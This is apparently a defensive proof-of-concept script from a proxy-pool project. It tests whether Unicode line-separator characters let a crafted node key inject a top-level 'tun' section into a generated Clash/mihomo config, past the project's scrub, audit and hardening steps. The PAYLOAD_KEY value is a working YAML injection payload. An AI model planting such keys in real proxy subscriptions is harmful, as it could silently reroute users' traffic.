#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Lead 交叉验证 B-1: Unicode 行分隔符能否让键名逃逸出 proxies 段。"""
import sys

import yaml

sys.path.insert(0, r"E:\AI\freeVPN")
import pool  # noqa: E402

print("=" * 66)
print("第一步 · scrub 是否清除这些字符, PyYAML 是否把它们当换行")
print("=" * 66)
for name, ch in [("U+2028 LINE SEP", "\u2028"), ("U+2029 PARA SEP", "\u2029"),
                 ("U+0085 NEL", "\x85"), ("U+000A LF", "\n")]:
    survived = ch in pool.scrub(f"a{ch}b")
    doc = f"a: 1{ch}b: 2"
    try:
        parsed = yaml.safe_load(doc)
        treats = isinstance(parsed, dict) and "b" in parsed
    except Exception:
        treats = False
    print(f"  {name:18} scrub后存活={str(survived):5}  PyYAML当换行={treats}")

print()
print("=" * 66)
print("第二步 · 端到端: 恶意键名能否往产物顶层注入 tun")
print("=" * 66)
PAYLOAD_KEY = ("x: 1\u2028tun:\u2028  enable: true\u2028  stack: system"
               "\u2028  auto-route: true\u2028  #")
raw = {
    "name": "evil", "type": "vmess", "server": "1.2.3.4", "port": 443,
    "uuid": "11111111-2222-3333-4444-555555555555", "alterId": 0,
    "cipher": "auto", "tls": True,
    PAYLOAD_KEY: "1",
}
n = pool.normalize(dict(raw))
print(f"  normalize 后键名里有恶意键: {any('tun' in str(k) for k in n)}")
kept, audit = __import__("security").audit_pool([n])
print(f"  安全审计: 扫描 {audit.scanned} 拦截 {audit.blocked} 告警 {audit.warned}")
if not kept:
    print("  >>> 被审计拦掉了, B-1 不成立")
    sys.exit(0)

text = pool.build_clash(kept, "B-1 PoC")
cfg = yaml.safe_load(text)
top = sorted(cfg.keys())
print(f"  产物顶层键: {top}")
print(f"  >>> 目标键 'tun' 是否出现在顶层: {'tun' in cfg}")
if "tun" in cfg:
    print(f"      tun = {cfg['tun']}")
    print("  >>> B-1 确认: 单条恶意节点往产物注入了顶层 tun, 绕过 harden 的 pop(\"tun\")")

# 再用内核校验这份产物
from pathlib import Path  # noqa: E402
poc = Path(r"E:\AI\freeVPN\state\lead-b1-poc.yaml")
poc.write_text(text, encoding="utf-8")
import subprocess  # noqa: E402
r = subprocess.run([str(pool.MIHOMO), "-d", str(pool.KERNEL_DIR), "-f", str(poc), "-t"],
                   capture_output=True, text=True, timeout=90,
                   encoding="utf-8", errors="replace")
print(f"  mihomo -t 退出码 {r.returncode}: "
      f"{((r.stdout or '') + (r.stderr or '')).strip().splitlines()[-1][:110]}")
